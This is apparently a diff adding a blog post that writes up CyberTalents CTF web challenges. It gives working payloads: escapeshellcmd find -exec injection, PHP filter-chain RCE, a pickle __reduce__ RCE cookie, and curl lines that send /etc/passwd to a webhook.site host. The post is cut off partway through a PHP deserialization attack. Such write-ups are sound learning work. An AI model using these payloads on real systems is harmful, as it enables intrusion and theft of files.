@@ -1,0 +1,805 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/macabely.png">
+  <link rel="icon" href="/img/macabely.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Macabely">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Some web challenges i solved on CyberTalents">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CyberTalents Web challenges">
+<meta property="og:url" content="https://xyz-macabely.github.io/2025/08/01/cybertalents/index.html">
+<meta property="og:site_name" content="Macabely">
+<meta property="og:description" content="Some web challenges i solved on CyberTalents">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://xyz-macabely.github.io/images/cybertalents/image.png">
+<meta property="article:published_time" content="2025-07-31T21:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-30T09:05:16.422Z">
+<meta property="article:author" content="Macabely">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://xyz-macabely.github.io/images/cybertalents/image.png">
+  
+  
+  
+  <title>CyberTalents Web challenges - Macabely</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xyz-macabely.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Macabely</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://x.com/Macabely97021" target="_self">
+                <i class="iconfont icon-twitter-fill"></i>
+                <span></span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://www.linkedin.com/in/ali-hassan-02a479219" target="_self">
+                <i class="iconfont icon-linkedin-fill"></i>
+                <span></span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/null') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="CyberTalents Web challenges"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          10k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          88 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">CyberTalents Web challenges</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><img src="/images/cybertalents/image.png" srcset="/img/loading.gif" lazyload></p>
+<p>I’m gonna share some challenges that i solved on CyberTalents</p>
+<h1 id="Escape-202"><a href="#Escape-202" class="headerlink" title="Escape_202"></a>Escape_202</h1><div class="note note-primary">
+            <p>I made this service to search in the files and directories in the server But my secrets leaked from file at<br><code>/radnomString_flag.txt</code></p> 
+          </div>
+
+<p>We have a simple search function with source code provided:</p>
+<p><img src="/images/cybertalents/Pasted%20image%2020250721223626.png" srcset="/img/loading.gif" lazyload></p>
+<p>Looking at the source code, we find the following:</p>
+<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] === <span class="hljs-string">&quot;POST&quot;</span>) &#123;
+        <span class="hljs-variable">$search</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;search&#x27;</span>]);
+        <span class="hljs-variable">$command</span> = <span class="hljs-string">&quot;find / -name &quot;</span> .<span class="hljs-variable">$search</span>;
+        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$command</span>);
+        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;Search Results:&lt;/h2&gt;&quot;</span>;
+        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$output</span>) &#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span> . <span class="hljs-variable">$output</span> . <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;
+        &#125; <span class="hljs-keyword">else</span> &#123;
+            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;No files found matching your search criteria.&lt;/p&gt;&quot;</span>;
+        &#125;
+    &#125;
+    <span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>As we can see, the code takes the <code>search</code> parameter and sanitizes it with <code>escapeshellcmd()</code> function by escaping special characters in a string that could be interpreted as shell commands, preventing unintended command execution.  </p>
+<p>At first glance, we can say it’s a command injection vulnerability. But the only thing stopping us is the <code>escapeshellcmd()</code> function. So it has to be something in it, right? Otherwise, there will be no point making this challenge.  </p>
+<p>By investigating further, looking for ways to bypass this function, I came across this github repo: <a target="_blank" rel="noopener" href="https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#find">exploit-bypass-php-escapeshellarg</a></p>
+<p><img src="/images/cybertalents/Pasted%20image%2020250721225024.png" srcset="/img/loading.gif" lazyload></p>
+<p>I found an exploit that has the same code as i have. All we need is to add our payload:<br><code>sth -or -exec &lt;command&gt; ; -quit</code> and you are good to go.  </p>
+<p>First, we need to know the files exists on the system, the flag is probably on the root domain. By adjusting the payload: <code>sth -or -exec ls / ; -quit</code> and adding it to the search parameter.</p>
+<p><img src="/images/cybertalents/Pasted%20image%2020250721225531.png" srcset="/img/loading.gif" lazyload alt="Flag File"></p>
+<p>There is another way to do this. you can simply add an asterisk <code>*</code> that will list you all the files exist in the system. The shell will try to interpret the <code>*</code> before the find command in the code runs. This is called globbing or <a target="_blank" rel="noopener" href="https://www.geeksforgeeks.org/linux-unix/bash-pathname-expansion-in-linux/">pathname expansion</a>.  </p>
+<p>This will print you the flag file. Now, we need to read it using this payload:<br><code>sth -or -exec cat /sKFmdyk7_flag.txt ; -quit</code>. </p>
+<p><img src="/images/cybertalents/Pasted%20image%2020250721225846.png" srcset="/img/loading.gif" lazyload alt="Flag"></p>
+<hr>
+<h1 id="Hack-if-u-can"><a href="#Hack-if-u-can" class="headerlink" title="Hack if u can"></a>Hack if u can</h1><div class="note note-primary">
+            <p>Find the RCE to get access to the system</p> 
+          </div>
+
+<p>From the description, we need a way to execute commands on the system.<br>It’s a simple shopping site that selling wine</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20132837.png" srcset="/img/loading.gif" lazyload></p>
+<p>I ran a fuzzer in the background and started exploring the site. The site had some functions, but they all dead, just for decoration. The fuzzer gave me 6 endpoints:</p>
+<ol>
+<li><code>/index.html</code></li>
+<li><code>/about.html</code></li>
+<li><code>/shop.html</code></li>
+<li><code>/contact.html</code></li>
+<li><code>/policy.html</code></li>
+<li><code>/robots.txt</code></li>
+</ol>
+<p>The <code>/robots.txt</code> file had this:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20135101.png" srcset="/img/loading.gif" lazyload></p>
+<p>Now we know the flag exists in the <code>/etc</code> directory (all those endpoints were dead on the url).</p>
+<p>I start analyzing the endpoints i got from the fuzzer, at the end of each one of them, you will find a link that will redirect you to <code>/policy.html</code>, except the <code>/shop.html</code> will redirect you to <code>/policy.php</code>.</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20133753.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20133706.png" srcset="/img/loading.gif" lazyload></p>
+<p>When you visit <code>/policy.php</code>, you will receive a cookie</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20134637.png" srcset="/img/loading.gif" lazyload></p>
+<p>That is a little weird. I requested that file and got the following:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20135351.png" srcset="/img/loading.gif" lazyload alt="This message was printed on the root domain too"></p>
+<p>The cookie probably gets us files that exist on the system. So what if we manipulate cookie and try to read files in the system? Leading to LFI.</p>
+<p>I set the cookie in the request, changed it to <code>../../../etc/passwd</code>, and got the following:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20135823.png" srcset="/img/loading.gif" lazyload></p>
+<p>Cool! Now let’s read the flag we found in the <code>/robots.txt</code> file</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20140032.png" srcset="/img/loading.gif" lazyload></p>
+<p>Ahhh, we didn’t get RCE yet. I tried to use PHP wrappers to read internal files too. I tried reading <code>policy.php</code> with the filter wrapper: <code>php://filter/read=convert.base64-encode/resource=policy.php</code> and found this code:</p>
+<div class="code-wrapper"><pre><code class="hljs PHP">
+<span class="hljs-meta">&lt;?php</span>
+<span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;read&quot;</span>, <span class="hljs-string">&quot;b204217b677944e7c8d2a12c670b5467.txt&quot;</span>);
+<span class="hljs-variable">$flagFile</span> = <span class="hljs-string">&quot;flag_48cbe4247cc8f7937ff091f257b4e160.txt&quot;</span>;<span class="hljs-comment">// /etc/(flagfile)</span>
+<span class="hljs-variable">$fileName</span> = <span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&#x27;read&#x27;</span>];
+
+<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag_48cbe4247cc8f7937ff091f257b4e160/&#x27;</span>, <span class="hljs-variable">$fileName</span>))&#123;
+    <span class="hljs-variable">$print</span>=<span class="hljs-number">0</span>;
+    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You can&#x27;t read this file, try harder.&quot;</span>;
+    <span class="hljs-keyword">die</span>();
+&#125;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>That’s why we can’t read the flag directly with the LFI. One of the first ways i think of to get rce using php wrappers is <strong>php-filters-chain</strong>. I went to this article and used their tool <a target="_blank" rel="noopener" href="https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it">php-filters-chain-what-is-it-and-how-to-use-it</a>.</p>
+<p>I start with <code>whoami</code> command chain: <code>python .\php_filter_chain_generator.py --chain &#39;&lt;?php system(&quot;whoami&quot;); ?&gt;&#39;</code>.<br>I got the payload, added it to the cookie, and got the results:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20141056.png" srcset="/img/loading.gif" lazyload></p>
+<p>Cool! now let’s read the flag: <code>python .\php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;cat /etc/flag_48cbe4247cc8f7937ff091f257b4e160.txt&#39;); ?&gt;&quot;</code></p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20141618.png" srcset="/img/loading.gif" lazyload></p>
+<p>We got an error; the payload was too big. We can change the command to truncate the payload a little bit:</p>
+<ol>
+<li><code>python .\php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;cat /etc/*&#39;); ?&gt;&quot;</code><br>OR</li>
+<li><code>python .\php_filter_chain_generator.py --chain &quot;&lt;?php system(&#39;more /etc/*&#39;); ?&gt;&quot;</code></li>
+</ol>
+<p>And you get the flag<br><img src="/images/cybertalents/Screenshot%202025-08-28%20141821.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h1 id="Evil-Rick"><a href="#Evil-Rick" class="headerlink" title="Evil Rick"></a>Evil Rick</h1><div class="note note-primary">
+            <p>We have noticed some weird actions on our website , we think that our passwd file has been compromised , can you make sure that it is secure</p> 
+          </div>
+
+<p>We need access to <code>/etc/passwd</code> file to get the flag. First, you will see a login page.</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20173715.png" srcset="/img/loading.gif" lazyload></p>
+<p>I found the creds in the HTML comments.</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20173757.png" srcset="/img/loading.gif" lazyload></p>
+<p>After a successful login with the remember me option on, you will get two cookies:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20174047.png" srcset="/img/loading.gif" lazyload></p>
+<p>And the page looks like this:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20174151.png" srcset="/img/loading.gif" lazyload></p>
+<p>I took the cookie and base64 decoded it and got this:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20175053.png" srcset="/img/loading.gif" lazyload></p>
+<p>From the page, we see a pickle image, and the token format looks like a pickle object. I used this script from <a target="_blank" rel="noopener" href="https://r3billions.com/writeup-pickle-store/">writeup-pickle-store</a> to make sure:</p>
+<div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> pickle
+
+data = <span class="hljs-string">&quot;gANjX19tYWluX18KdXNyCnEAKYFxAX1xAihYCAAAAHVzZXJuYW1lcQNYBAAAAHRlc3RxBFgIAAAAcGFzc3dvcmRxBVgEAAAAdGVzdHEGdWIu&quot;</span>
+decoded_data = base64.b64decode(data)
+pickle_object = pickle.loads(decoded_data)
+<span class="hljs-built_in">print</span>(pickle_object)</code></pre></div>
+
+<p>The script gives me an error: <code>AttributeError: Can&#39;t get attribute &#39;usr&#39; on &lt;module &#39;__main__&#39; </code>. This error happened cause the cookie data describes an object that was an instance of a class named <strong>usr</strong>.<br>The script tries to rebuild the object; it looks for a class definition named <strong>usr</strong> within the script, but because it doesn’t even exist, it throws an error.<br>To fix that we need to create the <strong>usr</strong> class <strong>before</strong> unpickle the data. From the decoded data, we cau assume that there is username, password arguments in the class. So i made this script:</p>
+<div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> pickle
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">usr</span>:
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password</span>):
+        <span class="hljs-variable language_">self</span>.username = username
+        <span class="hljs-variable language_">self</span>.password = password
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;usr(username=&#x27;<span class="hljs-subst">&#123;self.username&#125;</span>&#x27;, password=&#x27;<span class="hljs-subst">&#123;self.password&#125;</span>&#x27;)&quot;</span>
+
+data = <span class="hljs-string">&quot;gANjX19tYWluX18KdXNyCnEAKYFxAX1xAihYCAAAAHVzZXJuYW1lcQNYBAAAAHRlc3RxBFgIAAAAcGFzc3dvcmRxBVgEAAAAdGVzdHEGdWIu&quot;</span>
+decoded_data = base64.b64decode(data)
+pickle_object = pickle.loads(decoded_data)
+<span class="hljs-built_in">print</span>(pickle_object)</code></pre></div>
+
+<p>And i got these results: <code>usr(username=&#39;test&#39;, password=&#39;test&#39;)</code>.<br>Cool! Now we know the pickle structure. I went to this writeup <a target="_blank" rel="noopener" href="https://r3billions.com/writeup-pickle-store/">writeup-pickle-store</a> and start making the script again:</p>
+<div class="code-wrapper"><pre><code class="hljs PYTHON"><span class="hljs-keyword">import</span> pickle
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> base64
+
+COMMAND = <span class="hljs-string">&quot;curl https://webhook.site/04309ada-ed9e-4ac2-9f7c-33771ac78ce5&quot;</span>
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">PickleRce</span>(<span class="hljs-title class_ inherited__">object</span>):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
+        <span class="hljs-keyword">import</span> os
+        <span class="hljs-keyword">return</span> (os.system,(COMMAND,))
+
+<span class="hljs-keyword">class</span> <span class="hljs-title class_">usr</span>(<span class="hljs-title class_ inherited__">object</span>):
+    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username, password</span>):
+        <span class="hljs-variable language_">self</span>.username = username
+        <span class="hljs-variable language_">self</span>.password = password
+
+<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+    user = usr(username=<span class="hljs-string">&quot;test&quot;</span>, password=PickleRce())
+
+<span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(user)))</code></pre></div>
+
+<p>I created a malicious payload that will send a request to my webhook url. By replacing the payload with the intended <code>rememberme</code> cookie, you should receive a request in your webhook:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20183002.png" srcset="/img/loading.gif" lazyload></p>
+<p>Great! Now we need to read <code>/etc/passwd</code> and send the content to the webhook. There are two ways:</p>
+<ol>
+<li>Change the command to:<br><code>curl &lt;WEBHOOK&gt; --data-binary @/etc/passwd</code><br>OR<br><code>curl &lt;WEBHOOK&gt; -d @/etc/passwd</code></li>
+<li>Change the command to: curl <a target="_blank" rel="noopener" href="https://webhook.site/04309ada-ed9e-4ac2-9f7c-33771ac78ce5">https://webhook.site/04309ada-ed9e-4ac2-9f7c-33771ac78ce5</a> `cat &#x2F;etc&#x2F;passwd | base64` (That’s probably gonna fail through parsing errors)</li>
+</ol>
+<p>I used the first method and i got the flag:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-28%20190924.png" srcset="/img/loading.gif" lazyload></p>
+<hr>
+<h1 id="Game-Zone"><a href="#Game-Zone" class="headerlink" title="Game Zone"></a>Game Zone</h1><div class="note note-primary">
+            <p>We created a gaming platform, but something is not secure, can you confirm that no body can access passwd file.</p> 
+          </div>
+
+<p>Again, the goal is to read the <code>/etc/passwd</code> file. First thing you will see is a simple page with a login button:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-29%20161649.png" srcset="/img/loading.gif" lazyload></p>
+<p>Once you press the button, you will be redirected to <code>/profile.php</code> page with three cookies:</p>
+<ol>
+<li><code>profile_id=683220190</code> </li>
+<li><code>_user_session=6d21e2a5c97337c6afc59ab627fc433b</code></li>
+<li><code>profile_info=Tzo0OiJVc2VyIjozOntzOjE0OiIAVXNlcgB1c2VybmFtZSI7czoxNjoiTGltYSBDaGFybGllXzAyMCI7czoxMzoiAFVzZXIAaXNBZG1pbiI7YjowO3M6NjoiYWN0aXZlIjtzOjExOiIxNzU2NDczNDg1CiI7fQ%3D%3D</code></li>
+</ol>
+<p>The most important is <code>profile_info</code> one, it looks like url then base64 encoded. I took the token and decoded it and found the following:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-29%20162117.png" srcset="/img/loading.gif" lazyload></p>
+<p>This looks like a serialization format. We have a user class that has three arguments:</p>
+<ol>
+<li>username</li>
+<li>isAdmin</li>
+<li>active</li>
+</ol>
+<p>The server takes the cookie, deserializes it, and gets the data to get the intended user like that:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-29%20162621.png" srcset="/img/loading.gif" lazyload></p>
+<p>The first thing that comes to my mind is a deserialization attack, since i didn’t find anything useful on the site. I start playing with the serialized cookie to make a malicious one. I made this PHP code to help me with that:</p>
+<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>; <span class="hljs-keyword">private</span> <span class="hljs-variable">$isAdmin</span>; <span class="hljs-keyword">public</span> <span class="hljs-variable">$active</span>;&#125;
+<span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
+<span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionObject</span>(<span class="hljs-variable">$u</span>);
+<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;username&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;username&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-string">&#x27;test&#x27;</span>);
+<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;isAdmin&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;isAdmin&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-number">1</span>);
+<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;active&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;active&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-string">&#x27;1756471575&#x27;</span>);
+<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$u</span>)).PHP_EOL;
+<span class="hljs-meta">?&gt;</span></code></pre></div>
+
+<p>I changed the username and set the <code>isAdmin</code> argument to 1, we may get admin privileges from that.<br>I used the result cookie from the script and found this:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-29%20163319.png" srcset="/img/loading.gif" lazyload></p>
+<p>Cool! The attack works fine. The image changed to another one, indicating that we are admin now because of the image name, it was <code>guest.jpg</code> before:</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-29%20163505.png" srcset="/img/loading.gif" lazyload></p>
+<p>The admin account doesn’t really give anything useful. We still need to manipulate the cookie more, getting command injection to read the <code>/etc/passwd</code> file. </p>
+<p>I start thinking about gadget chains and magic methods, but the thing is, it’s almost impossible to leverage these attacks without the source code.  </p>
+<p>So i fuzzed on almost everything (endpoints, parameters, headers) and i found something weird. When you add a slash <code>/</code> after the <code>profile.php</code> endpoint like this <code>/profile.php/</code>. The page gets wider, and i saw two new headers in the request</p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-29%20172045.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/cybertalents/Screenshot%202025-08-29%20172123.png" srcset="/img/loading.gif" lazyload></p>
+<p>While searching on those headers on MDN, i found they are related to fetching resources, faster rendering that is used to optimize browser performance, nothing much. </p>
+<p>I couldn’t find the source code to find a new class that may use a magic method that will help in the exploit, so it has to be in that <strong>User</strong> class. I start looking on the class arguments again and i got interested with the <strong>active</strong> argument.</p>
+<p>This argument uses a <a target="_blank" rel="noopener" href="https://www.unixtimestamp.com/">Unix Timestamp</a>, the server is taking a value that the user provides and <strong>processing</strong> it into a human-readable date string, we may get a command injection here. I changed the code and start adding a delimiter <code>;</code> in the <strong>active</strong> argument’s value and inject a <code>whoami</code> command after it:</p>
+<div class="code-wrapper"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span>&#123;<span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span>; <span class="hljs-keyword">private</span> <span class="hljs-variable">$isAdmin</span>; <span class="hljs-keyword">public</span> <span class="hljs-variable">$active</span>;&#125;
+<span class="hljs-variable">$command</span> = <span class="hljs-string">&#x27;whoami&#x27;</span>;
+<span class="hljs-variable">$u</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
+<span class="hljs-variable">$r</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionObject</span>(<span class="hljs-variable">$u</span>);
+<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;username&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;username&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-string">&#x27;attacker&#x27;</span>);
+<span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;isAdmin&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-variable">$r</span>-&gt;<span class="hljs-title function_ invoke__">getProperty</span>(<span class="hljs-string">&#x27;isAdmin&#x27;</span>)-&gt;<span class="hljs-title function_ invoke__">setValue</span>(<span class="hljs-variable">$u</span>,<span class="hljs-number">1</span>);
